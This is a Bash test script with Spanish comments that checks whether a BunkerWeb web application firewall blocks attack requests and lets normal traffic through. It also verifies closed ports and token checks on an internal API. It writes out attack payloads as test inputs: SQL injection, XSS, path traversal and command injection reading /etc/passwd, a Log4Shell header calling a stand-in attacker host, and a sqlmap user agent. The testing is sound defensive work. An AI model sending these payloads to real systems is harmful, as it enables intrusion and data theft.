#!/usr/bin/env bash
# CA-20: el WAF deja pasar el trafico normal (200/302) y bloquea los ataques (403).
# Adaptado de waf-stack (commit 87a5f62, pruebas.sh): rutas de esta aplicacion, comprobacion de que
# web y GLPI no responden fuera de BunkerWeb y de que la API interna exige API_TOKEN.
#
#   infra/waf/pruebas.sh app.localhost
#   infra/waf/pruebas.sh glpi.localhost
#   infra/waf/pruebas.sh app.ejemplo.duckdns.org 20.1.2.3     # dominio + IP del servidor
#
# Tras muchas pruebas la IP puede quedar baneada 1 hora (BAD_BEHAVIOR_BAN_TIME=3600):
#   docker compose -f infra/compose.yaml exec bw-scheduler bwcli unban <ip>
set -u

DOMINIO="${1:-app.localhost}"
IP="${2:-127.0.0.1}"
BASE="https://$DOMINIO"
CURL=(curl -skg -o /dev/null -w "%{http_code}" --max-time 10 --resolve "$DOMINIO:443:$IP")
VERDE=$'\e[32m'; ROJO=$'\e[31m'; NORMAL=$'\e[0m'
FALLOS=0

probar() {  # esperados(separados por |) descripcion curl-args...
  local esperados="$1" descripcion="$2"; shift 2
  local codigo
  # 1 s entre peticiones: el limite de BunkerWeb es 2 por segundo (RS-08). Sin pausa, los ataques
  # reciben 429 del limite y no 403 del CRS, y la prueba no demuestra que el CRS los detecte.
  sleep "${PAUSA:-1}"
  codigo=$("${CURL[@]}" "$@")
  if [[ "|$esperados|" == *"|$codigo|"* ]]; then
    printf "  %s%-4s%s %-46s (esperado %s)\n" "$VERDE" "$codigo" "$NORMAL" "$descripcion" "$esperados"
  else
    printf "  %s%-4s%s %-46s (esperado %s)\n" "$ROJO" "$codigo" "$NORMAL" "$descripcion" "$esperados"
    FALLOS=$((FALLOS + 1))
  fi
}

echo "Objetivo: $BASE (IP $IP)"
echo
echo "Trafico normal"
if [[ "$DOMINIO" == app.* ]]; then
  probar "200" "Salud"                                   "$BASE/salud"
  probar "200" "Pagina de ingreso"                       "$BASE/ingreso"
  probar "302" "Sin sesion redirige al ingreso"          "$BASE/solicitudes"
  probar "200" "Estatico servido por WhiteNoise"         "$BASE/static/web/estilo.css"
else
  probar "200|302" "Pagina principal de GLPI"            "$BASE/"
fi
probar "301|302|308" "HTTP redirige a HTTPS" --resolve "$DOMINIO:80:$IP" "http://$DOMINIO/"

echo
echo "Ataques (deben ser bloqueados)"
probar 403 "Inyeccion SQL (GET)"         "$BASE/?id=1'%20OR%20'1'%3D'1"
probar 403 "Inyeccion SQL (POST)"        -X POST -d "correo=admin'--&contrasena=x" "$BASE/ingreso"
probar 403 "XSS"                         "$BASE/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
probar 403 "Recorrido de rutas"          "$BASE/?archivo=../../../../etc/passwd"
probar 403 "Inyeccion de comandos"       "$BASE/?cmd=%3Bcat%20/etc/passwd"
probar 403 "Log4Shell en cabecera"       -H 'X-Api-Version: ${jndi:ldap://atacante.example/a}' "$BASE/"
probar 403 "Escaner (User-Agent sqlmap)" -A "sqlmap/1.8" "$BASE/"

echo
echo "Nada responde por fuera de BunkerWeb (RS-02, T19)"
for puerto in 8000 3306 5000; do
  codigo=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "http://$IP:$puerto/" || true)
  if [ "$codigo" = "000" ]; then
    printf "  %sOK%s   puerto %s cerrado\n" "$VERDE" "$NORMAL" "$puerto"
  else
    printf "  %sFALLA%s puerto %s responde (%s)\n" "$ROJO" "$NORMAL" "$puerto" "$codigo"
    FALLOS=$((FALLOS + 1))
  fi
done

if command -v docker > /dev/null && [ -n "$(docker ps -q --filter name=bw-scheduler 2> /dev/null)" ]; then
  echo
  echo "API interna de BunkerWeb (RS-19): rechaza sin token y acepta con el token"
  # Desde el scheduler (IP en la lista blanca): si rechaza sin token pero acepta con el, el
  # rechazo es por el API_TOKEN. BunkerWeb rechaza CERRANDO la conexion (sin codigo HTTP).
  resultado=$(docker exec "$(docker ps -q --filter name=bw-scheduler | head -1)" python3 -c "
import os, urllib.request as u, urllib.error as e
def codigo(cab):
    try:
        return str(u.urlopen(u.Request('http://bunkerweb:5000/ping', headers={'Host': 'bwapi', **cab}), timeout=5).status)
    except e.HTTPError as x:
        return str(x.code)
    except Exception:
        return 'cerrada'
print(codigo({}), codigo({'Authorization': 'Bearer malo'}), codigo({'Authorization': 'Bearer ' + os.environ['API_TOKEN']}))" 2> /dev/null || echo "? ? ?")
  read -r sin malo con <<< "$resultado"
  if [[ "$sin" =~ ^(401|403|cerrada)$ && "$malo" =~ ^(401|403|cerrada)$ && "$con" = "200" ]]; then
    printf "  %sOK%s   sin token: %s · token malo: %s · token correcto: %s
" "$VERDE" "$NORMAL" "$sin" "$malo" "$con"
  else
    printf "  %sFALLA%s sin token: %s · token malo: %s · token correcto: %s
" "$ROJO" "$NORMAL" "$sin" "$malo" "$con"
    FALLOS=$((FALLOS + 1))
  fi
fi

echo
if [ "$FALLOS" -eq 0 ]; then
  echo "${VERDE}Todo segun lo esperado.${NORMAL}"
else
  echo "${ROJO}$FALLOS resultado(s) distinto(s) a lo esperado.${NORMAL}"
  echo "Si todo da 403, la IP puede seguir baneada: bwcli unban (ver arriba)."
  exit 1
fi
